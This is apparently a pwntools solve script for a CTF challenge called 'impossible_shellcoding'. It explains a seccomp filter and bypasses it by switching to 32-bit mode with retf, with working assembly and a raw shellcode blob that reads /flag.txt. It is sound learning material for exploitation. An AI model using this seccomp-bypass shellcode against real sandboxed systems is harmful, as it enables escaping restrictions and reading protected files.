from pwn import *
context.arch = 'amd64'

# The binary reads in some shellcode and runs it.
# However, there are some really annoying protections
# that stop you from doing anything useful.

# 1. Stop Execve and suid
#       prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)
#   prctl() is a mechanism to limit what a process can do.
#   The first prctl was meant to stop you from running execve() as other users
#   and changing the suid bits.

# 2. Setup SECCOMP rules
#       prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &seccomp_rules, 0, 0)
#   This prctl() was used to setup a custom SECCOMP filter.
#   The SECCOMP filter is a 'program' that when run, decides
#   whether or not a syscall is blocked.
#   The SECCOMP filter below only blocks syscalls based 
#   on the syscall number (K in the output below).

#   (Run `seccomp-tools dump impossible_shellcoding` to get this)

# line  CODE  JT   JF      K
#=================================
# 0000: 0x20 0x00 0x00 0x00000004  A = arch
# 0001: 0x15 0x00 0x00 0xc000003e  /* no-op */
# 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
# 0003: 0x35 0x0c 0x00 0x40000000  if (A >= 0x40000000) goto 0016
# 0004: 0x15 0x0b 0x00 0x00000002  if (A == open) goto 0016
# 0005: 0x15 0x0a 0x00 0x00000101  if (A == openat) goto 0016
# 0006: 0x15 0x09 0x00 0x00000055  if (A == creat) goto 0016
# 0007: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0016
# 0008: 0x15 0x07 0x00 0x00000039  if (A == fork) goto 0016
# 0009: 0x15 0x06 0x00 0x0000003a  if (A == vfork) goto 0016
# 0010: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0016
# 0011: 0x15 0x04 0x00 0x00000038  if (A == clone) goto 0016
# 0012: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 0016
# 0013: 0x15 0x02 0x00 0x0000009d  if (A == prctl) goto 0016
# 0014: 0x15 0x01 0x00 0x0000009e  if (A == arch_prctl) goto 0016
# 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
# 0016: 0x06 0x00 0x00 0x00000000  return KILL

# We can see that execve and execveat are blocked, so no shell (also due to
# the first prctl)

# Open/Openat is also blocked! We can't write shellcode to open the file and
# read it, then write to stdout.

# fork/vfork/clone are blocked, so we can't create new processes that are free
# of these seccomp restrictions

# Any syscall above 0x40000000 is blocked. There was a funny trick where
# you could syscall 0x40000000 + syscall_num_you_actually_want to call
# the syscall and bypass seccomp, due to the x32 ABI of kernels.

# So far, the major problem is that open() and its variants can't be used.
# read/write are still available
# There is another syscall called open_by_handle_at that I wanted to use,
# but for it to work the binary had to be root (I wasted 5 hours on this)

# There's still one more trick tho: Executing 32-bit code instead.
# In 32-bit code, we can use 32-bit syscalls (which have different syscall
# numbers) to bypass the seccomp filter, as the seccomp filter only blocks
# the syscall based on its number
# To run 32-bit code from 64-bit code, we can use the retf instruction
# which pops 2 values from the stack, the first being the next instruction
# address and the second being the new value of the CS (Code Segment) register
# If the CS register becomes 0x33, it is executing 64-bit code
# If the CS register becomes 0x23, it is executing 32-bit code

# Since 32-bit code can only read the lower 32-bits from 64-bit registers,
# we have to make sure we reset the registers the shellcode uses to lower
# values (including the instruction pointer register!)

# The above technique was based off of http://uaf.io/exploitation/2016/09/06/TokyoWesterns-MMA-Diary.html

## The Plan:
#   1. Send in 64-bit shellcode that does the following
#       1. mmap with low addresses with RWX (read-write-exec) permissions
#       2. Read in 32-bit shellcode that opens the file and reads it
#           a) the orginal binary only reads in 256 bytes - not enough!
#       3. retf to the mmap'ed memory to run the 32-bit shellcode
#   2. Send in the 32-bit shellcode
#   3. Receive the flag

if args['R'] == '1':
    p = remote('ctf.pwn.sg', 7123)
else:
    p = process('./impossible_shellcoding')

mmap = '''
xor rax, rax
mov al, 9
mov rdi, 0x602000
mov rsi, 0x1000
mov rdx, 7
mov r10, 0x32
mov r8, 0xffffffff
mov r9, 0
syscall'''

read = '''
mov rax, 0
xor rdi, rdi
mov rsi, 0x602190
mov rdx, 100
syscall'''

retf = '''
xor rsp, rsp
mov esp, 0x602160
mov DWORD PTR [esp+4], 0x23
mov DWORD PTR [esp], 0x602190
retf
'''
sc = mmap + read + retf
f = asm(sc)

print(len(f))

# Send 64-bit shellcode
p.sendline(f)

# Send 32-bit shellcode that open-reads the flag and writes to stdout
# Copied from http://shell-storm.org/shellcode/files/shellcode-73.php
p.sendline("\x31\xc0\x31\xdb\x31\xc9\x31\xd2"+
"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"+
"\x80\x89\xc6\xeb\x06\xb0\x01\x31"+
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"+
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"+
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"+
"\x04\xb3\x01\xb2\x01\xcd\x80\x83"+
"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"+
"\xff"+
"/flag.txt\x00")

# Recv the flag
print(p.recv())
